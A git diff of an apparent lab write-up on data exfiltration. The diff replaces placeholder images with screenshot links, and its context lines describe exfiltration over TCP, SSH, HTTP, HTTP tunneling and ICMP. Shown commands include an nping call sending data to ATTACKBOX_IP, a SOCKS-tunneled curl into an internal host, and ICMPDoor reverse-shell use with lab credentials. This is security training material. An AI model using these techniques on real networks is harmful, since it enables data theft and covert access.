@@ -13,15 +13,11 @@ Data Exfiltration is the process of taking an unauthorized copy of sensitive dat
 
 we have built a network to simulate practical scenarios where we can perform data exfiltration and tunneling using various network protocols. The provided VM contains two separated networks with multiple clients. We also have a "JumpBox" machine that accesses both networks.
 
-### 1.png
-
-![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)
+![App Screenshot](https://github.com/rohit00712/Red-Team/blob/main/Post%20Compromise/data_Exfiltration/images/1.png)
 
 Use the network diagram for your reference during the coming tasks for various protocols. We also set up a domain name, thm.com, to make it easier to communicate and connect within the network environment. Check the following table for more information about the domain names and network access used in this room.
 
-### 2.png
-
-![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)
+![App Screenshot](https://github.com/rohit00712/Red-Team/blob/main/Post%20Compromise/data_Exfiltration/images/2.png)
 
 -------------------------------------------------------
 
@@ -35,25 +31,19 @@ There are three primary use case scenarios of data exfiltration, including:
 
 ### Traditional Data Exfiltration
 
-### 3.png
-
-![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)
+![App Screenshot](https://github.com/rohit00712/Red-Team/blob/main/Post%20Compromise/data_Exfiltration/images/3.png)
 
 The traditional Data Exfiltration scenario is moving sensitive data out of the organization's network. An attacker can make one or more network requests to transfer the data, depending on the data size and the protocol used. Note that a threat actor does not care about the reply or response to his request. Thus, all traffic will be in one direction, from inside the network to outside. Once the data is stored on the attacker's server, he logs into it and grabs the data.
 
 ### C2 Communications
 
-### 4.png
-
-![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)
+![App Screenshot](https://github.com/rohit00712/Red-Team/blob/main/Post%20Compromise/data_Exfiltration/images/4.png)
 
 Many C2 frameworks provide options to establish a communication channel, including standard and non-traditional protocols to send commands and receive responses from a victim machine. In C2 communications a limited number of requests where an attacker sends a request to execute a command in the victim's machine. Then, the agent's client executes the command and sends a reply with the result over a non-traditional protocol. The communications will go in two directions: into and out of the network.
 
 ### Tunneling
 
-### 5.png
-
-![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)
+![App Screenshot](https://github.com/rohit00712/Red-Team/blob/main/Post%20Compromise/data_Exfiltration/images/5.png)
 
 In the Tunneling scenario, an attacker uses this data exfiltration technique to establish a communication channel between a victim and an attacker's machine. The communication channel acts as a bridge to let the attacker machine access the entire internal network. There will be continuous traffic sent and received while establishing the connection.
 
@@ -67,9 +57,7 @@ Besides the TCP socket, we will also use various other techniques, including `da
 
 The following diagram explains how traditional communications over TCP work.
 
-### 6.png
-
-![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)
+![App Screenshot](https://github.com/rohit00712/Red-Team/blob/main/Post%20Compromise/data_Exfiltration/images/6.png)
 
 * Communication over TCP requires two machines, one victim and one attacker machine, to transfer data.
 
@@ -85,9 +73,7 @@ we need to prepare a listener
 
 We have the required data ready to be transmitted on the victim machine. In this case, we have a sample file with a couple of credentials.
 
-### 7.png
-
-![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)
+![App Screenshot](https://github.com/rohit00712/Red-Team/blob/main/Post%20Compromise/data_Exfiltration/images/7.PNG)
 
 Now that we have the credential text file, we will use the TCP socket to exfiltrate it. **Make sure the listener is running on the JumpBox/Attacker_Machine.**
 
@@ -99,17 +85,13 @@ Now that we have the credential text file, we will use the TCP socket to exfiltr
 
 we should receive the encoded data in the /tmp/ directory.
 
-### 8.png
-
-![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)
+![App Screenshot](https://github.com/rohit00712/Red-Team/blob/main/Post%20Compromise/data_Exfiltration/images/8.PNG)
 
 On the JumpBox, we need to convert the received data back to its original status. We will be using the dd tool to convert it back.
 
 `dd conv=ascii if=task4-creds.data |base64 -d > task4-creds.tar`
 
-### 9.png
-
-![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)
+![App Screenshot](https://github.com/rohit00712/Red-Team/blob/main/Post%20Compromise/data_Exfiltration/images/9.PNG)
 
 Next, we need to use the `tar` command to unarchive the `task4-creds.tar` file and check the content as follows,
 
@@ -125,9 +107,7 @@ Success! We exfiltrated data from a victim machine to an attacker machine using 
 
 In this task we will show how to use SSH protocol to exfiltrate data over to an attacking machine. SSH protocol establishes a secure channel to interact and move data between the client and server, so all transmission data is encrypted over the network or the Internet.
 
-### 10.png
-
-![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)
+![App Screenshot](https://github.com/rohit00712/Red-Team/blob/main/Post%20Compromise/data_Exfiltration/images/10.png)
 
 To transfer data over the SSH, we can use either the Secure Copy Protocol `SCP` or the SSH client. Let's assume that we don't have the `SCP` command available to transfer data over SSH. Thus, we will focus more on the SSH client in this task.
 
@@ -135,9 +115,7 @@ As we mentioned earlier, an attacker needs to control a server, which in this ca
 
 Let's assume that we have gained access to sensitive data that must be transmitted securely.  Let's connect to the `victim1` or `victim2` machine.
 
-### 11.png
-
-![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)
+![App Screenshot](https://github.com/rohit00712/Red-Team/blob/main/Post%20Compromise/data_Exfiltration/images/11.PNG)
 
 Let's use the same technique we discussed in the "exfiltration using a TCP socket" task, where we will be using the tar command to archive the data and then transfer it.
 
@@ -164,17 +142,13 @@ Exfiltration data through the HTTP protocol is one of the best options because i
 
 Let's login to the `web.thm.com` machine using `thm:tryhackme` credentials and inspect the Apache log file with two HTTP requests, one for the GET and the other for the POST, and check what they look like!
 
-### 12.png
-
-![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)
+![App Screenshot](https://github.com/rohit00712/Red-Team/blob/main/Post%20Compromise/data_Exfiltration/images/12.PNG)
 
 Obviously, the first line is a GET request with a file parameter with exfiltrated data. If you try to decode it using the based64 encoding, you would get the transmitted data, which in this case is `thm:tryhackme`. While the second request is a POST to `example.php`, we sent the same base64 data, but it doesn't show what data was transmitted.
 
 **In a typical real-world scenario**, an attacker controls a web server in the cloud somewhere on the Internet. An agent or command is executed from a compromised machine to send the data outside the compromised machine's network over the Internet into the webserver. Then an attacker can log in to a web server to get the data, as shown in the following figure.
 
-### 13.png
-
-![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)
+![App Screenshot](https://github.com/rohit00712/Red-Team/blob/main/Post%20Compromise/data_Exfiltration/images/13.png)
 
 ## HTTP Data Exfiltration
 
@@ -218,9 +192,7 @@ We used the curl command with `--data` argument to send a POST request via the `
 
 Next, from the `victim1 or JumpBox machine`, let's log in to the webserver, `web.thm.com`, and check the `/tmp` directory if we have successfully transferred the required data. Use the following SSH credentials in order to login into the web: `thm:tryhackme`.
 
-### 14.png
-
-![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)
+![App Screenshot](https://github.com/rohit00712/Red-Team/blob/main/Post%20Compromise/data_Exfiltration/images/14.PNG)
 
 Nice! We have received the data, but if you look closely at the `http.bs64` file, you can see it is broken `base64`. This happens due to the URL encoding over the HTTP. The `+` symbol has been replaced with empty spaces, so let's fix it using the `sed` command as follows,
 
@@ -242,9 +214,7 @@ Tunneling over the HTTP protocol technique encapsulates other protocols and send
 
 Before diving into HTTP tunneling details, let's discuss a typical scenario where many internal computers are not reachable from the Internet. For example, in our scenario, the `uploader.thm.com` server is reachable from the Internet and provides web services to everyone. However, the `app.thm.com` server runs locally and provides services only for the internal network as shown in the following figure:
 
-### 15.png
-
-![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)
+![App Screenshot](https://github.com/rohit00712/Red-Team/blob/main/Post%20Compromise/data_Exfiltration/images/15.png)
 
 In this section, we will create an HTTP tunnel communication channel to pivot into the internal network and communicate with local network devices through HTTP protocol. Let's say that we found a web application that lets us upload an HTTP tunnel agent file to a victim webserver, `uploader.thm.com`. Once we upload and connect to it, we will be able to communicate with `app.thm.com`. 
 
@@ -258,9 +228,7 @@ Next, we need to generate an encrypted client file to upload it to the victim we
 
 The previous command generates encrypted Tunneling clients with `thm` key in the `neoreg_servers/` directory. Note that there are various extensions available, including PHP, ASPX, JSP, etc. In our scenario, we will be uploading the `tunnel.php` file via the uploader machine. To access the uploader machine, you can visit the following URL: http://MACHINE_IP/uploader or https://LAB_WEB_URL.p.thmlabs.com/uploader without the need for a VPN.
 
-### 16.png
-
-![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)
+![App Screenshot](https://github.com/rohit00712/Red-Team/blob/main/Post%20Compromise/data_Exfiltration/images/16.png)
 
 To upload the PHP file, use admin as the key to let you upload any files into the `uploader.thm.com`.
 
@@ -274,15 +242,11 @@ For example, if we want to access the app.thm.com, which has an internal IP addr
 
 `curl --socks5 127.0.0.1:1080 http://172.20.0.121:80`
 
-### 17.png
-
-![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)
+![App Screenshot](https://github.com/rohit00712/Red-Team/blob/main/Post%20Compromise/data_Exfiltration/images/17.PNG)
 
 The following diagram shows the traffic flow as it goes through the uploader machine and then communicates with the internal network devices, which in this case, is the App machine. Note that if we check the network traffic from the App machine, we see that the source IP address of incoming traffic comes from the uploader machine.
 
-### 18.png
-
-![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)
+![App Screenshot](https://github.com/rohit00712/Red-Team/blob/main/Post%20Compromise/data_Exfiltration/images/18.png)
 
 -------------------------------------------------------
 
@@ -292,9 +256,7 @@ In this task, we will be showing how to exfiltrate data using the ICMP protocol.
 
 Network devices such as routers use `ICMP` protocol to check network connectivities between devices. Note that the ICMP protocol is not a transport protocol to send data between devices. Let's say that two hosts need to test the connectivity in the network; then, we can use the `ping` command to send `ICMP` packets through the network, as shown in the following figure.
 
-### 19.png
-
-![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)
+![App Screenshot](https://github.com/rohit00712/Red-Team/blob/main/Post%20Compromise/data_Exfiltration/images/19.png)
 
 The `HOST1` sends an `ICMP` packet with an `echo-request` packet. Then, if `HOST2` is available, it sends an ICMP packet back with an `echo reply` message confirming the availability.
 
@@ -302,9 +264,7 @@ The `HOST1` sends an `ICMP` packet with an `echo-request` packet. Then, if `HOST
 
 On a high level, the `ICMP` packet's structure contains a `Data` section that can include strings or copies of other information, such as the `IPv4 header`, used for error messages. The following diagram shows the `Data` section, which is optional to use.
 
-### 20.png
-
-![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)
+![App Screenshot](https://github.com/rohit00712/Red-Team/blob/main/Post%20Compromise/data_Exfiltration/images/20.png)
 
 Note that the Data field is optional and could either be empty or it could contain a random string during the communications.
 
@@ -318,9 +278,7 @@ We used the `xxd` command to convert our string to Hex, and then we can use the 
 
 Let's look at the Data section for this packet in the Wireshark.
 
-### 21.png
-
-![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)
+![App Screenshot](https://github.com/rohit00712/Red-Team/blob/main/Post%20Compromise/data_Exfiltration/images/21.png)
 
 Excellent! We have successfully filled the ICMP's Data section with our data and manually sent it over the network using the `ping` command.
 
@@ -336,9 +294,7 @@ Now that we have the basic fundamentals of manually sending data over ICMP packe
 
 The following diagram shows the required steps for the Metasploit framework. Since we need the Metasploit Framework for this technique, then we need the AttackBox machine to perform this attack successfully.
 
-### 22.png
-
-![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)
+![App Screenshot](https://github.com/rohit00712/Red-Team/blob/main/Post%20Compromise/data_Exfiltration/images/22.png)
 
 Now from the AttackBox, let's set up the Metasploit framework
 
@@ -357,9 +313,7 @@ First, we will send the BOF trigger from the ICMP machine so that the Metasploit
 
 `thm@icmp-host:~# sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "BOFfile.txt"`
 
-### 23.png
-
-![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)
+![App Screenshot](https://github.com/rohit00712/Red-Team/blob/main/Post%20Compromise/data_Exfiltration/images/23.PNG)
 
 Let's start sending the required data and the end of the file trigger value from the ICMP machine.
 
@@ -371,19 +325,13 @@ Let's start sending the required data and the end of the file trigger value from
 
 Let's check our AttackBox once we have done sending the data and the ending trigger value.
 
-### 24.png
-
-![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)
+![App Screenshot](https://github.com/rohit00712/Red-Team/blob/main/Post%20Compromise/data_Exfiltration/images/24.PNG)
 
 Nice! We have successfully transferred data over the ICMP protocol using the Metasploit Framework. You can check the loot file mentioned in the terminal to confirm the received data.
 
-### ICMP C2 Communication
-
 Next, we will show executing commands over the ICMP protocol using the ICMPDoor tool. ICMPDoor is an open-source reverse-shell written in Python3 and scapy. The tool uses the same concept we discussed earlier in this task, where an attacker utilizes the Data section within the ICMP packet. The only difference is that an attacker sends a command that needs to be executed on a victim's machine. Once the command is executed, a victim machine sends the execution output within the ICMP packet in the Data section.
 
-### 25.png
-
-![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)
+![App Screenshot](https://github.com/rohit00712/Red-Team/blob/main/Post%20Compromise/data_Exfiltration/images/25.png)
 
 We have prepared the tools needed for C2 communication over the ICMP protocol on `JumpBox` and the `ICMP-Host machines`. First, we need to log in to the ICMP machine,`icmp.thm.com`, and execute the icmpdoor binary as follows,
 
@@ -395,9 +343,7 @@ Next, log in to the `JumpBox` and execute the `icmp-cnc` binary to communicate w
 
 `thm@jump-box$  sudo icmp-cnc -i eth1 -d 192.168.0.121`
 
-### 26.png
-
-![App Screenshot](https://via.placeholder.com/468x300?text=App+Screenshot+Here)
+![App Screenshot](https://github.com/rohit00712/Red-Team/blob/main/Post%20Compromise/data_Exfiltration/images/26.PNG)
 
 Similar to the client-side binary, ensure to select the interface for the communication as well as the destination IP. As the previous terminal shows, we requested to execute the `hostname` command, and we received `icmp-host`.
 
